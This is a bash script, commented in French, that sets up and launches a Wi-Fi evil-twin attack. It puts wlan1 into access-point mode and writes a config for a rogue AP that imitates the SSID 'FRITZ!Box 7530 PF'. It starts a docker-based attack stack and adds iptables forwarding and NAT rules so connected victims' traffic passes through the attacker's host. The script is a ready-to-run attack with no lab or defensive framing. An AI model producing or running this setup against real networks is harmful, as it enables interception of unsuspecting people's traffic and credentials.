#!/bin/bash
MGMT_IP="192.168.178.65"
WLAN0_IP=$(ip -4 addr show wlan0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')

if [ "$WLAN0_IP" != "$MGMT_IP" ]; then
    echo "[!!!] ERREUR : wlan0 n'a pas l'IP de management ($MGMT_IP) ! IP actuelle: $WLAN0_IP"
    exit 1
fi
echo "[+] wlan0 OK ($MGMT_IP)"

echo "[*] Préparation de wlan1 (Mode AP)..."
sudo nmcli device set wlan1 managed no 2>/dev/null
sudo ip link set wlan1 down
sudo ip addr flush dev wlan1
sudo ip link set wlan1 up

cat <<PULP > attack.pulp
set interface wlan1
set ssid FRITZ!Box 7530 PF
set proxy noproxy
start
PULP

echo "[+] Lancement du build final et de l'attaque..."
docker compose up -d --build

# Fix: Docker utilise iptables-nft avec FORWARD DROP par défaut
# On ajoute les règles pour autoriser le trafic wlan1 <-> eth0
echo "[*] Ajout des règles iptables-nft pour le forwarding..."
sudo iptables -I FORWARD 1 -i wlan1 -o eth0 -j ACCEPT
sudo iptables -I FORWARD 2 -i eth0 -o wlan1 -m state --state RELATED,ESTABLISHED -j ACCEPT
sudo iptables -t nat -C POSTROUTING -o eth0 -s 10.0.0.0/8 -j MASQUERADE 2>/dev/null || sudo iptables -t nat -A POSTROUTING -o eth0 -s 10.0.0.0/8 -j MASQUERADE
echo "[+] Forwarding iptables-nft OK"
